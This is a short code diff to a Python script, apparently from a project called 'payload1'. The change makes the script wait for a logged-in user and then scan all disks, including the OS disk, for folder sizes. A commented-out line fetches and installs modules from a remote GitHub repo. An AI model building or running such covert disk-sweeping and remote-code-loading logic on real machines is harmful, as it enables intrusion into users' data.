@@ -151,13 +151,33 @@ def format_size(size_bytes):
     size_gb = size_bytes / (1024 ** 3)
     return f"{size_gb:.2f}"
 
+def is_user_logged_in():
+    try:
+        result = subprocess.run(["echo", "%username%"], capture_output=True, text=True, shell=True)
+        username = result.stdout.strip()
+        return bool(username)
+    except Exception as e:
+        print(f"Error : {e}")
+        return False
+
+def sleep_until_user_loged():
+    while True:
+        if is_user_logged_in():
+            break
+        else:
+            print("No user connected")
+        time.sleep(5)
+
 #Install modules :
 #download_and_install_whls('https://api.github.com/repos/slayy2357/payload1/contents/modules')
 
 #Scan all available disks function
 #Param 1 : for all disks
 #Param 2 : for no OS disks
-for disks in scan_disks(2, 10):
+
+sleep_until_user_loged()
+
+for disks in scan_disks(1, 10):
     for disks in disks:
         #Calcul disk size
         total_size = get_folder_size(str(disks))
